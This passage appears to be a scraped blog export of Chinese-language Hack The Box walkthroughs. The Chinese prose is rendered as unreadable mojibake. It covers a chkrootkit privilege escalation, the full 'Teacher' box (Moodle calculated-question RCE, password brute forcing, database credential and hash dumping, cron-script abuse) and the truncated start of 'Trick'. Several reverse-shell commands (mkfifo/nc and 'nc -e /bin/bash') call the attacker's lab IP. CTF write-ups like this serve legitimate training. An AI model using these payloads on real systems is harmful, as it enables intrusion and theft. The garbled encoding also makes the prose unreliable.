report-22-07-08:00:21.txt\n```\nä¸å¤ªäº†è§£æ˜¯ä»€ä¹ˆï¼Œå»çœ‹ä¸‹æŸ¥è¯¢ä¸€ä¸‹\n\nåœ¨æŸ¥è¯¢ä»¥åŠè·‘äº†ä¸€ä¸ª pspy åï¼Œå¾—åˆ°äº†ä¸€ä¸ªä¸€ç›´æŒç»­è¿è¡Œç€çš„æ–‡ä»¶ /usr/bin/chkrootkit\n\n> [https://www.exploit-db.com/exploits/33899](https://www.exploit-db.com/exploits/33899)\n\nç»è¿‡æŸ¥æ‰¾åï¼Œæ‰¾åˆ°äº†è¿™ä¹ˆä¸€ä¸ªæ¼æ´\n\nç„¶ååœ¨ /tmp ä¸‹åˆ›å»ºä¸€ä¸ªåä¸º update çš„æ–‡ä»¶ï¼Œå†™å…¥å¦‚ä¸‹å†…å®¹\n\n```bash\n#!/bin/bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.19 4444 >/tmp/f\n```\nç»™ update ä¸€ä¸ªæ‰§è¡Œæƒé™\n\n```bash\nchmod +x /tmp/update\n```\nç„¶åä½¿ç”¨ nc å¼€å¯ä¸€ä¸ªç«¯å£ç›‘å¬ ç­‰å¾… shell å›æ¥å°±å¯ä»¥äº†\n\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.14.19] from (UNKNOWN) [10.10.10.43] 57140\n/bin/sh: 0: can't access tty; job control turned off\n# whoami&&id                      \nroot\nuid=0(root) gid=0(root) groups=0(root)\n```\næˆåŠŸææƒåˆ° root æƒé™\n\n```bash\n# cat /root/root.txt\na35547e94d50dd524433ee8e427733ea\n```\næˆåŠŸæ‹¿åˆ° root æƒé™çš„ flag æ–‡ä»¶","tags":["Hackthebox"]},{"title":"Teacher - Hackthebox","url":"/2022/06/30/Hackthebox/Easy/Hackthebox-Teacher/","content":"\n# Hackthebox - Teacher\n# é¶åœºä¿¡æ¯\n![](Hackthebox-Teacher/29d2c6d8-74e6-456b-8f84-c0d1839c69d2.png)\n\n# é¶åœºç±»å‹\n![](Hackthebox-Teacher/12fbbd6f-c0d6-4865-9f6b-45b11f112e19.png)\n\n# ä¿¡æ¯æ”¶é›†\n## Nmap\n```bash\nâ”Œâ”€â”€(rootğŸ’€lucifiel)-[~]\nâ””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.153\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-06-30 09:20 CST\nNmap scan report for 10.10.10.153\nHost is up (0.17s latency).\nNot shown: 65534 closed ports\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd 2.4.25 ((Debian))\n|_http-server-header: Apache/2.4.25 (Debian)\n|_http-title: Blackhat highschool\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=6/30%OT=80%CT=1%CU=36344%PV=Y%DS=2%DC=T%G=Y%TM=62BCFA9\nOS:9%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=107%TI=Z%CI=I%II=I%TS=8)OPS\nOS:(O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST1\nOS:1NW7%O6=M539ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN\nOS:(R=Y%DF=Y%T=40%W=7210%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A\nOS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R\nOS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F\nOS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%\nOS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD\nOS:=S)\n\nNetwork Distance: 2 hops\n\nTRACEROUTE (using port 22/tcp)\nHOP RTT       ADDRESS\n1   170.79 ms 10.10.14.1\n2   171.01 ms 10.10.10.153\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 40.07 seconds\n```\n## Http\n![](Hackthebox-Teacher/1e4608da-14bc-4b0b-b3b0-c32748a6bdde.png)\n\n## Fuzz\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# ffuf -u 'http://10.10.10.153/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 200\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.5.0 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.10.10.153/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 200\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500\n________________________________________________\n\nfonts                   [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 342ms]\nphpmyadmin              [Status: 403, Size: 297, Words: 22, Lines: 12, Duration: 339ms]\nmanual                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 355ms]\nimages                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 5521ms]\ncss                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 5521ms]\njavascript              [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 5542ms]\njs                      [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 6427ms]\nmoodle                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 340ms]\nserver-status           [Status: 403, Size: 300, Words: 22, Lines: 12, Duration: 345ms]\n                        [Status: 200, Size: 8028, Words: 514, Lines: 250, Duration: 1349ms]\n:: Progress: [30000/30000] :: Job [1/1] :: 161 req/sec :: Duration: [0:02:01] :: Errors: 96 ::\n```\næŒ¨ä¸ªè®¿é—®åå‘ç° phpmyadmin æ— æƒé™è®¿é—®ï¼Œmanual å¾—åˆ°äº†ä¸€ä¸ªä¿¡æ¯ï¼Œè¯¥é¶æœºä½¿ç”¨çš„ä¸­é—´ä»¶æ˜¯ Apache HTTP Server Version 2.4ã€‚è®¿é—® moodle ç›®å½•ä¼šè·³è½¬åˆ° http://teacher.htb/moodleï¼Œæˆ‘ä»¬å»åŠ ä¸€ä¸ªhosts\n\n```bash\necho 10.10.10.153 teacher.htb >> /etc/hosts\n```\n![](Hackthebox-Teacher/81e7be9a-ed9e-4424-a5ca-0344a074e741.png)\n\nè¿™è¾¹æ‹¿åˆ°äº†ä¸€ä¸ªè´¦å·ï¼Œä½†æ˜¯æ²¡æœ‰å¯†ç ï¼Œå»çœ‹çœ‹å…¶ä»–æ€è·¯ã€‚\n\n![](Hackthebox-Teacher/f507b96c-bf54-4480-a2c4-5fdd3966cda5.png)\n\nè¿™å¼ å›¾ç‰‡ä¸€çœ‹å°±æœ‰ç‚¹ä¸å¯¹ï¼Œæˆ‘ä»¬å»è®¿é—®ä¸€ä¸‹çœ‹çœ‹\n\n![](Hackthebox-Teacher/98fb4b3b-f5de-4e63-b734-ff729b5dd542.png)\n\næ–‡ä»¶æŸåï¼Ÿä¸‹è½½ä¸‹æ¥çœ‹çœ‹\n\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# wget http://teacher.htb/images/5.png                           \n--2022-06-30 10:42:06--  http://teacher.htb/images/5.png\næ­£åœ¨è§£æä¸»æœº teacher.htb (teacher.htb)... 10.10.10.153\næ­£åœ¨è¿æ¥ teacher.htb (teacher.htb)|10.10.10.153|:80... å·²è¿æ¥ã€‚\nå·²å‘å‡º HTTP è¯·æ±‚ï¼Œæ­£åœ¨ç­‰å¾…å›åº”... 200 OK\né•¿åº¦ï¼š200 [image/png]\næ­£åœ¨ä¿å­˜è‡³: â€œ5.pngâ€\n\n5.png                                                      100%[========================================================================================================================================>]     200  --.-KB/s  ç”¨æ—¶ 0s      \n\n2022-06-30 10:42:07 (14.1 MB/s) - å·²ä¿å­˜ â€œ5.pngâ€ [200/200])\n\n\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# ls                          \n5.png\n\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# file 5.png                                                                                                        \n5.png: ASCII text\n```\nè¿™æ˜¯ä¸€ä¸ª text æ–‡æœ¬æ–‡ä»¶ï¼Œè¯»å–ä¸€ä¸‹å†…å®¹\n\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# cat 5.png     \nHi Servicedesk,\n\nI forgot the last charachter of my password. The only part I remembered is Th4C00lTheacha.\n\nCould you guys figure out what the last charachter is, or just reset it?\n\nThanks,\nGiovanni\n```\nå¾—åˆ°äº†ä¸€ä¸ªè´¦å·å¯†ç ï¼Œä½†å¯†ç çš„æœ€åä¸€ä½ä¸ç¡®å®š\n\n```bash\nusername = Giovanni\npassword = Th4C00lTheacha?\n```\næˆ‘ä»¬å»çˆ†ç ´ä¸€ä¸‹æœ€åä¸€ä½å¯†ç \n\n# æ¼æ´åˆ©ç”¨\né¦–å…ˆä½¿ç”¨ç°æœ‰çš„å¯†ç å»ç”Ÿæˆä¸€ä¸ªå¯†ç å­—å…¸\n\n```bash\nTh4C00lTheachaa\nTh4C00lTheachab\nTh4C00lTheachac\nTh4C00lTheachad\nTh4C00lTheachae\nTh4C00lTheachaf\nTh4C00lTheachag\nTh4C00lTheachah\nTh4C00lTheachai\nTh4C00lTheachaj\nTh4C00lTheachak\nTh4C00lTheachal\nTh4C00lTheacham\nTh4C00lTheachan\nTh4C00lTheachao\nTh4C00lTheachap\nTh4C00lTheachaq\nTh4C00lTheachar\nTh4C00lTheachas\nTh4C00lTheachat\nTh4C00lTheachau\nTh4C00lTheachav\nTh4C00lTheachaw\nTh4C00lTheachax\nTh4C00lTheachay\nTh4C00lTheachaz\nTh4C00lTheacha!\nTh4C00lTheacha@\nTh4C00lTheacha#\nTh4C00lTheacha$\nTh4C00lTheacha%\nTh4C00lTheacha^\nTh4C00lTheacha&\nTh4C00lTheacha*\nTh4C00lTheacha(\nTh4C00lTheacha)\nTh4C00lTheacha_\nTh4C00lTheacha-\nTh4C00lTheacha+\nTh4C00lTheacha=\nTh4C00lTheacha.\nTh4C00lTheacha?\nTh4C00lTheacha/\nTh4C00lTheacha\\\nTh4C00lTheacha0\nTh4C00lTheacha1\nTh4C00lTheacha2\nTh4C00lTheacha3\nTh4C00lTheacha4\nTh4C00lTheacha5\nTh4C00lTheacha6\nTh4C00lTheacha7\nTh4C00lTheacha8\nTh4C00lTheacha9\n```\nç„¶åå»çˆ†ç ´ä¸€ä¸‹\n\n![](Hackthebox-Teacher/c6a0e0bf-e09c-4f14-a05b-6555547c1962.png)\n\nè¿™è¾¹ Th4C00lTheacha# çš„ç»“æœä¸ä¸€æ ·ï¼Œå°±æ˜¯æ­£ç¡®å¯†ç äº†ï¼Œæˆ‘ä»¬å¾—åˆ°äº†ä¸€ä¸ªè´¦å·å¯†ç \n\n```bash\nusername = Giovanni\npassword = Th4C00lTheacha#\n```\n![](Hackthebox-Teacher/b9c7f3b6-87ba-4c96-81ea-d7c3fb9a81c1.png)\n\nè¿™è¾¹é’ˆå¯¹ moodle æ‰¾åˆ°äº†ä¸€ç¯‡æ¼æ´çš„å‚è€ƒæ–‡ç« \n\n> [https://blog.sonarsource.com/moodle-remote-code-execution/?redirect=rips](https://blog.sonarsource.com/moodle-remote-code-execution/?redirect=rips)\n\né¦–å…ˆï¼Œæˆ‘ä»¬å°†è¿›å…¥`Algebra`è¯¾ç¨‹\n\n![](Hackthebox-Teacher/06f645ab-8990-4d77-aedc-37a9fd2716a8.png)\n\nç„¶åæ‰“å¼€ç¼–è¾‘\n\n![](Hackthebox-Teacher/b736266e-6c53-4ba7-9c4f-481719cd7495.png)\n\n![](Hackthebox-Teacher/4f298a66-f373-439b-8b16-d26da7596aad.png)\n\nç„¶åéšä¾¿é€‰ä¸€ä¸ªç‚¹å‡» Add an activity or resource è¿›è¡Œæ·»åŠ \n\nç„¶åé€‰æ‹© Quiz\n\n![](Hackthebox-Teacher/a6013e82-e3a4-4f24-836a-f3e4faad623e.png)\n\nè¿™é‡Œéšä¾¿å¡«ï¼Œç„¶åsave and display\n\n![](Hackthebox-Teacher/044ed8ef-9edf-4ea1-ab4a-2ef97dc82415.png)\n\næ¥ç€ edit quiz\n\n![](Hackthebox-Teacher/921d4364-6b64-4719-a978-ae2fda18f22b.png)\n\nç„¶å a new question æ–°å¢ä¸€ä¸ªæ–°é—®é¢˜\n\n![](Hackthebox-Teacher/04aecc7e-5266-401c-97aa-50c61acc3cee.png)\n\nç„¶åé€‰æ‹©calculated\n\n![](Hackthebox-Teacher/ed6e8725-f14d-4caa-b1e7-aecc2e9ab7cf.png)\n\nä¸Šé¢éšä¾¿å¡«å†™ï¼Œanswer 1 formalu è¾“å…¥æˆ‘ä»¬çš„payloadï¼Œç„¶ågradeé€‰æ‹©100%å°±è¡Œ\n\n```bash\n/*{a*/`$_GET[0]`;//{x}}\n```\nç„¶å save change\n\n![](Hackthebox-Teacher/98955b9c-2215-4703-88ca-a12bff29952f.png)\n\n```bash\nhttp://teacher.htb/moodle/question/question.php?returnurl=%2Fmod%2Fquiz%2Fedit.php%3Fcmid%3D7%26addonpage%3D0&appendqnumstring=addquestion&scrollpos=0&id=6&wizardnow=datasetitems&cmid=7\n```\nç‚¹å‡» next page è¿›å…¥é¡µé¢ï¼Œå¾—åˆ°äº†ä¸Šé¢çš„åœ°å€\n\nç„¶åä½¿ç”¨ nc å¼€å¯ä¸€ä¸ªç«¯å£ç›‘å¬\n\n```bash\n&0=(nc -e /bin/bash 10.10.14.2 4444)\n```\næœ€åå°†æˆ‘ä»¬çš„ shell åå¼¹è¯­å¥æ·»åŠ åˆ°urlçš„æœ€åé¢\n\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# nc -nvlp 4444                       \nlistening on [any] 4444 ...\nconnect to [10.10.14.2] from (UNKNOWN) [10.10.10.153] 56932\nwhoami&&id\nwww-data\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")';\nwww-data@teacher:/var/www/html/moodle/question$\n```\næˆåŠŸè·å–åˆ°ä¸€ä¸ª shell\n\n```bash\nwww-data@teacher:/var/www/html/moodle/question$ cd /home\ncd /home\nwww-data@teacher:/home$ ls\nls\ngiovanni\nwww-data@teacher:/home$ cd giovanni\ncd giovanni\nbash: cd: giovanni: Permission denied\n```\næˆ‘ä»¬æ²¡æœ‰æƒé™è®¿é—®ç”¨æˆ·ç›®å½•\n\n# æƒé™æå‡\n## User\nè¿™è¾¹ç”¨çš„æ˜¯ moodle çš„ cmsï¼Œè€Œåœ¨ä¹‹å‰ fuzz çš„æ—¶å€™æœ‰çœ‹åˆ°ä¸€ä¸ª phpmyadminï¼Œæ‰€ä»¥æˆ‘çŒœæµ‹æ˜¯å’Œæ•°æ®åº“æœ‰å…³ã€‚\n\næ—¢ç„¶å’Œæ•°æ®åº“æœ‰å…³ï¼Œåˆæ˜¯ cmsï¼Œé‚£ä¹ˆå¾ˆå¯èƒ½é…ç½®æ–‡ä»¶ä¸­æœ‰æ•°æ®çš„è´¦å·å¯†ç ï¼Œå»æ‰¾ä¸€ä¸‹\n\n```bash\nwww-data@teacher:/var/www/html/moodle$ ls                                                                                                                                                                                                   \nls                                                                                                                                                                                                                                          \nCONTRIBUTING.txt           config-dist.php.bak  message                                                                                                                                                                                     \nCOPYING.txt                config.php           mnet                                                                                                                                                                                        \nGruntfile.js               config.php.save      mod                                                                                                                                                                                         \nINSTALL.txt                course               my                                                                                                                                                                                          \nPULL_REQUEST_TEMPLATE.txt  dataformat           notes                                                                                                                                                                                       \nREADME.txt                 draftfile.php        npm-shrinkwrap.json                                                                                                                                                                         \nTRADEMARK.txt              enrol                package.json                                                                                                                                                                                \nadmin                      error                phpunit.xml.dist                                                                                                                                                                            \nanalytics                  file.php             pix                                                                                                                                                                                         \nauth                       files                plagiarism                                                                                                                                                                                  \navailability               filter               pluginfile.php                                                                                                                                                                              \nbackup                     githash.php          portfolio                                                                                                                                                                                   \nbadges                     grade                question                                                                                                                                                                                    \nbehat.yml.dist             group                rating                                                                                                                                                                                      \nblocks                     help.php             report                                                                                                                                                                                      \nblog                       help_ajax.php        repository                                                                                                                                                                                  \nbrokenfile.php             index.php            rss                                                                                                                                                                                         \ncache                      install              search                                                                                                                                                                                      \ncalendar                   install.php          tag                                                                                                                                                                                         \ncohort                     iplookup             theme                                                                                                                                                                                       \ncomment                    lang                 user                                                                                                                                                                                        \ncompetency                 lib                  userpix\ncompletion                 local                version.php\ncomposer.json              login                webservice\ncomposer.lock              media\nwww-data@teacher:/var/www/html/moodle$ cat config.php\ncat config.php\n<?php  // Moodle configuration file\n\nunset($CFG);\nglobal $CFG;\n$CFG = new stdClass();\n\n$CFG->dbtype    = 'mariadb';\n$CFG->dblibrary = 'native';\n$CFG->dbhost    = 'localhost';\n$CFG->dbname    = 'moodle';\n$CFG->dbuser    = 'root';\n$CFG->dbpass    = 'Welkom1!';\n$CFG->prefix    = 'mdl_';\n$CFG->dboptions = array (\n  'dbpersist' => 0,\n  'dbport' => 3306,\n  'dbsocket' => '',\n  'dbcollation' => 'utf8mb4_unicode_ci',\n);\n\n$CFG->wwwroot   = 'http://teacher.htb/moodle';\n$CFG->dataroot  = '/var/www/moodledata';\n$CFG->admin     = 'admin';\n\n$CFG->directorypermissions = 0777;\n\nrequire_once(__DIR__ . '/lib/setup.php');\n\n// There is no php closing tag in this file,\n// it is intentional because it prevents trailing whitespace problems!\n```\nåœ¨ /var/www/html/moodle/config.php ä¸­ï¼Œæ‰¾åˆ°äº†æ•°æ®åº“çš„è´¦å·å¯†ç \n\n```bash\n$CFG->dbuser    = 'root';\n$CFG->dbpass    = 'Welkom1!';\n```\n```bash\nmysql -h 127.0.0.1 -u root -p\nEnter password: Welkom1!\n\nWelcome to the MariaDB monitor.  Commands end with ; or \\g.\nYour MariaDB connection id is 499\nServer version: 10.1.26-MariaDB-0+deb9u1 Debian 9.1\n\nCopyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others.\n\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n\nMariaDB [(none)]>\n```\næˆåŠŸç™»å…¥ mysql\n\n```bash\nMariaDB [(none)]> show databases;\nshow databases;\n+--------------------+\n| Database           |\n+--------------------+\n| information_schema |\n| moodle             |\n| mysql              |\n| performance_schema |\n| phpmyadmin         |\n+--------------------+\n5 rows in set (0.00 sec)\n```\n```bash\nMariaDB [moodle]> show tables;\nshow tables;\n+----------------------------------+\n| Tables_in_moodle                 |\n+----------------------------------+\n| mdl_user                         |\n+----------------------------------+\n388 rows in set (0.00 sec)\n```\nè¡¨æœ‰å¾ˆå¤šï¼Œæˆ‘å°±åˆ—ä¸€ä¸ªå¯¹æˆ‘ä»¬æ¥è¯´æœ‰ç”¨çš„äº†\n\n```bash\nMariaDB [moodle]> select * from mdl_user;\nselect * from mdl_user;\n+------+--------+-----------+--------------+---------+-----------+------------+-------------+--------------------------------------------------------------+----------+------------+----------+----------------+-----------+-----+-------+-------+-----+-----+--------+--------+-------------+------------+---------+------+---------+------+--------------+-------+----------+-------------+------------+------------+--------------+---------------+--------+---------+-----+---------------------------------------------------------------------------+-------------------+------------+------------+-------------+---------------+-------------+-------------+--------------+--------------+----------+------------------+-------------------+------------+---------------+\n| id   | auth   | confirmed | policyagreed | deleted | suspended | mnethostid | username    | password                                                     | idnumber | firstname  | lastname | email          | emailstop | icq | skype | yahoo | aim | msn | phone1 | phone2 | institution | department | address | city | country | lang | calendartype | theme | timezone | firstaccess | lastaccess | lastlogin  | currentlogin | lastip        | secret | picture | url | description                                                               | descriptionformat | mailformat | maildigest | maildisplay | autosubscribe | trackforums | timecreated | timemodified | trustbitmask | imagealt | lastnamephonetic | firstnamephonetic | middlename | alternatename |\n+------+--------+-----------+--------------+---------+-----------+------------+-------------+--------------------------------------------------------------+----------+------------+----------+----------------+-----------+-----+-------+-------+-----+-----+--------+--------+-------------+------------+---------+------+---------+------+--------------+-------+----------+-------------+------------+------------+--------------+---------------+--------+---------+-----+---------------------------------------------------------------------------+-------------------+------------+------------+-------------+---------------+-------------+-------------+--------------+--------------+----------+------------------+-------------------+------------+---------------+\n|    1 | manual |         1 |            0 |       0 |         0 |          1 | guest       | $2y$10$ywuE5gDlAlaCu9R0w7pKW.UCB0jUH6ZVKcitP3gMtUNrAebiGMOdO |          | Guest user |          | root@localhost |         0 |     |       |       |     |     |        |        |             |            |         |      |         | en   | gregorian    |       | 99       |           0 |          0 |          0 |            0 |               |        |       0 |     | This user is a special user that allows read-only access to some courses. |                 1 |          1 |          0 |           2 |             1 |           0 |           0 |   1530058999 |            0 | NULL     | NULL             | NULL              | NULL       | NULL          |\n|    2 | manual |         1 |            0 |       0 |         0 |          1 | admin       | $2y$10$7VPsdU9/9y2J4Mynlt6vM.a4coqHRXsNTOq/1aA6wCWTsF2wtrDO2 |          | Admin      | User     | gio@gio.nl     |         0 |     |       |       |     |     |        |        |             |            |         |      |         | en   | gregorian    |       | 99       |  1530059097 | 1530059573 | 1530059097 |   1530059307 | 192.168.206.1 |        |       0 |     |                                                                           |                 1 |          1 |          0 |           1 |             1 |           0 |           0 |   1530059135 |            0 | NULL     |                  |                   |            |               |\n|    3 | manual |         1 |            0 |       0 |         0 |          1 | giovanni    | $2y$10$38V6kI7LNudORa7lBAT0q.vsQsv4PemY7rf/M1Zkj/i1VqLO0FSYO |          | Giovanni   | Chhatta  | Giio@gio.nl    |         0 |     |       |       |     |     |        |        |             |            |         |      |         | en   | gregorian    |       | 99       |  1530059681 | 1656564818 | 1656558129 |   1656558822 | 10.10.14.2    |        |       0 |     |                                                                           |                 1 |          1 |          0 |           2 |             1 |           0 |  1530059291 |   1530059291 |            0 |          |                  |                   |            |               |\n| 1337 | manual |         0 |            0 |       0 |         0 |          0 | Giovannibak | 7a860966115182402ed06375cf0a22af                             |          |            |          |                |         0 |     |       |       |     |     |        |        |             |            |         |      |         | en   | gregorian    |       | 99       |           0 |          0 |          0 |            0 |               |        |       0 |     | NULL                                                                      |                 1 |          1 |          0 |           2 |             1 |           0 |           0 |            0 |            0 | NULL     | NULL             | NULL              | NULL       | NULL          |\n+------+--------+-----------+--------------+---------+-----------+------------+-------------+--------------------------------------------------------------+----------+------------+----------+----------------+-----------+-----+-------+-------+-----+-----+--------+--------+-------------+------------+---------+------+---------+------+--------------+-------+----------+-------------+------------+------------+--------------+---------------+--------+---------+-----+---------------------------------------------------------------------------+-------------------+------------+------------+-------------+---------------+-------------+-------------+--------------+--------------+----------+------------------+-------------------+------------+---------------+\n4 rows in set (0.00 sec)\n```\næœ€ååªæœ‰ç¬¬å››ä¸ªç”¨æˆ·çš„ hash å¯ä»¥è§£å¯†å‡ºæ¥ï¼Œçœ‹åå­—æ˜¯ä¸ªå¤‡ä»½ï¼Œé‚£ç”¨æˆ·ååº”è¯¥å°±æ˜¯ giovanni äº†\n\n```bash\nusername = giovanni\npassword = expelled\n```\nè¿™å°±æ˜¯æˆ‘ä»¬åˆšæ‰æ²¡æœ‰æƒé™è®¿é—®çš„é‚£ä¸ªç”¨æˆ·ç›®å½•äº†ï¼Œå»åˆ‡æ¢åˆ°è¿™ä¸ªç”¨æˆ·è¯•è¯•\n\n```bash\nwww-data@teacher:/home$ su giovanni\nsu giovanni\nPassword: expelled\n\ngiovanni@teacher:/home$ whoami&&id\nwhoami&&id\ngiovanni\nuid=1000(giovanni) gid=1000(giovanni) groups=1000(giovanni)\n```\næˆåŠŸææƒåˆ° user æƒé™\n\n```bash\ngiovanni@teacher:/home$ cd giovanni\ncd giovanni\ngiovanni@teacher:~$ ls\nls\nuser.txt  work\ngiovanni@teacher:~$ cat user.txt\ncat user.txt\n9c991cf63230e31da617d2f1b8bb08d1\n```\næˆåŠŸæ‹¿åˆ° user æƒé™çš„ flag æ–‡ä»¶\n\n## Root\n```bash\ngiovanni@teacher:/usr/bin$ cat backup.sh\ncat backup.sh\n#!/bin/bash\ncd /home/giovanni/work;\ntar -czvf tmp/backup_courses.tar.gz courses/*;\ncd tmp;\ntar -xf backup_courses.tar.gz;\nchmod 777 * -R;\n```\nåœ¨ /usr/bin ç›®å½•ä¸‹å‘ç°ä¸€ä¸ªåä¸º bakcup.sh çš„è„šæœ¬\n\n```bash\ngiovanni@teacher:/usr/bin$ ls -la backup.sh\nls -la backup.sh\n-rwxr-xr-x 1 root root 138 Jun 27  2018 backup.sh\n```\næƒé™æ˜¯ root ç”¨æˆ·çš„ï¼Œå’±ä»¬æœ‰æ‰§è¡Œæƒé™ï¼Œä½†æ˜¯æ²¡æœ‰å†™å…¥æƒé™\n\nä½†æ˜¯è¿™é‡Œè„šæœ¬ä¸­æœ‰ä¸ªé—®é¢˜ chmod 777 \\* -R; è¿™ä¸€å¥æ˜¯ä»£è¡¨è¿™ç»™æ‰€æœ‰ç”¨æˆ·èµ‹äºˆäº†æ‰€æœ‰æƒé™ï¼Œè¿™é‡Œå°±æ˜¯ææƒçš„å…³é”®ç‚¹äº†\n\n```bash\ngiovanni@teacher:~/work$ ln -s /root ./tmp\nln -s /root ./tmp\ngiovanni@teacher:~/work$ ls -la\nls -la\ntotal 16\ndrwxr-xr-x 4 giovanni giovanni 4096 Mar 21 15:29 .\ndrwxr-x--- 4 giovanni giovanni 4096 Apr 27 14:59 ..\ndrwxr-xr-x 3 giovanni giovanni 4096 Mar 21 15:29 courses\ndrwxr-xr-x 3 giovanni giovanni 4096 Jun 30 07:33 tmp\n```\né¦–å…ˆåˆ›å»ºä¸€ä¸ªè½¯è¿æ¥ï¼Œå°†è¿™ä¸ªè„šæœ¬æœ¬èº«ç»™èµ‹äºˆ 777 æƒé™\n\n```bash\ncd /home/giovanni/work/tmp/\nrm -rf courses\nln -s /usr/bin/ courses\n```\nç„¶åæˆ‘ä»¬å°±æœ‰æƒé™å¯¹ backup.sh è¿™ä¸ªè„šæœ¬è¿›è¡Œä¿®æ”¹äº†\n\næ¥ç€ä½¿ç”¨ nc å†ç›‘å¬ä¸€ä¸ªç«¯å£\n\n```bash\nnc -nvlp 5555\n```\næ¥ç€å†™å…¥ä¸€ä¸ª nc åå¼¹è¯­å¥\n\n```bash\necho \"nc -e /bin/bash 10.10.14.2 5555\" >> /usr/bin/backup.sh\n```\nç„¶åç­‰ç€ shell åå¼¹å›æ¥å°±å¥½äº†\n\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# nc -nvlp 5555\nlistening on [any] 5555 ...\nconnect to [10.10.14.2] from (UNKNOWN) [10.10.10.153] 51910\nwhoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root)\n```\næˆåŠŸè·å¾— root æƒé™\n\n```bash\ncat /root/root.txt\n05d8e3ee43c6af33f80069c615a88e4b\n```\næˆåŠŸè·å¾— root æƒé™çš„ flag æ–‡ä»¶","tags":["Hackthebox"]},{"title":"Trick  - Hackthebox","url":"/2022/06/18/Hackthebox/Easy/Hackthebox-Trick /","content":"\n# Hackthebox - Trick \n# é¶åœºä¿¡æ¯\n![image](Hackthebox-Trick/a15baf12-ab15-46d4-b50e-36faa850cd4f.png)\n\n# é¶åœºç±»å‹\n![image](Hackthebox-Trick/6d4bd84c-f2d8-4d1f-9c1d-dfd449ddf64e.png)\n\n# ä¿¡æ¯æ”¶é›†\n## Nmap\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.166\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-06-19 21:55 EDT\nNmap scan report for 10.10.11.166\nHost is up (0.22s latency).\nNot shown: 65531 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\n| ssh-hostkey: \n|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)\n|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)\n|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)\n25/tcp open  smtp    Postfix smtpd\n|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, \n53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)\n| dns-nsid: \n|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian\n80/tcp open  http    